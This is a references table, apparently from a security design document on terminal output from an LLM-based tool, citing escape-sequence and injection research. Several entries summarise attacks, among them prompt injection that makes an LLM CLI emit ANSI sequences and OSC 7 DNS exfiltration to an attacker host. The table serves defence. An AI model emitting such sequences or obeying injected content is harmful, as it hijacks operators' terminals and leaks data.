| <a id="ref-4"></a>4 | XTerm Control Sequences | [invisible-island.net/xterm/ctlseqs/ctlseqs.html](https://invisible-island.net/xterm/ctlseqs/ctlseqs.html) | The reference for CSI, OSC (including 8 hyperlinks, 52 clipboard, 7 working directory), DCS/APC, and the query sequences a terminal answers. |
| <a id="ref-5"></a>5 | Terminal DiLLMa: LLM-powered Apps Can Hijack Your Terminal Via Prompt Injection | [embracethered.com](https://embracethered.com/blog/posts/2024/terminal-dillmas-prompt-injection-ansi-sequences/) | Injected content in a file makes an LLM CLI emit ANSI sequences that the operator's terminal executes; recommends printing LLM output with control characters encoded visibly. |
| <a id="ref-6"></a>6 | "\e[31m"?! ANSI Terminal security in 2023 and finding 10 CVEs | [dgl.cx/2023/09/ansi-terminal-security](https://dgl.cx/2023/09/ansi-terminal-security) | Query/echoback sequences (DECRQSS, title reporting, OSC 52 read) are the main exploitation path; twelve CVEs across major emulators; the safe way to print unknown text is printable characters only, and 8-bit C1 controls are to be avoided. |
| <a id="ref-7"></a>7 | Trojan Source: Invisible Vulnerabilities | [arxiv.org/abs/2111.00169](https://arxiv.org/abs/2111.00169) | Unicode bidirectional overrides and homoglyphs make source code read differently from how it compiles — the same trick applied to a rendered tool result or diff. |
| <a id="ref-8"></a>8 | CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences | [cwe.mitre.org/data/definitions/150.html](https://cwe.mitre.org/data/definitions/150.html) | The weakness class for T9d and T1e. |
| <a id="ref-9"></a>9 | From Indirect Prompt Injection to DNS Exfiltration in macOS Terminal via ANSI Escape Codes | [embracethered.com](https://embracethered.com/blog/posts/2026/macos-terminal-dillma-dns-exfil-ansi-escape-code-fix/) | An OSC 7 URL in LLM output made Terminal.app resolve an attacker hostname — exfiltration with no reply channel needed; fixed in macOS 26.1 (November 2025). |
| <a id="ref-10"></a>10 | CVE-2021-27291 — Pygments ReDoS | [nvd.nist.gov/vuln/detail/CVE-2021-27291](https://nvd.nist.gov/vuln/detail/CVE-2021-27291) | Regular-expression denial of service in several Pygments lexers — the host-side parser cost an attacker-chosen fenced-block language can trigger. |
| <a id="ref-11"></a>11 | H D Moore — Terminal Emulator Security Issues (2003) | [hdm.io/writing/termulation.txt](https://hdm.io/writing/termulation.txt) | The original survey of title reporting, screen dumping and escape-sequence exploitation across emulators; most of it is still a feature, not a bug. |
| <a id="ref-12"></a>12 | STÖK — Weaponizing Plain Text: ANSI Escape Sequences as a Forensic Nightmare (DEF CON 31) | [media.defcon.org](https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/ST%C3%96K%20-%20Weaponizing%20Plain%20Text%20ANSI%20Escape%20Sequences%20as%20a%20Forensic%20Nightmare.pdf) | Log injection with escape sequences against modern cloud CLIs and DevOps terminals: hidden lines, forged entries, clickable links, DoS. |
| <a id="ref-13"></a>13 | Rich — Console Markup: Escaping | [rich.readthedocs.io/en/stable/markup.html](https://rich.readthedocs.io/en/stable/markup.html#escaping) | `rich.markup.escape()` is required for any dynamic string placed in a markup string; `Text` objects are not parsed as markup. |
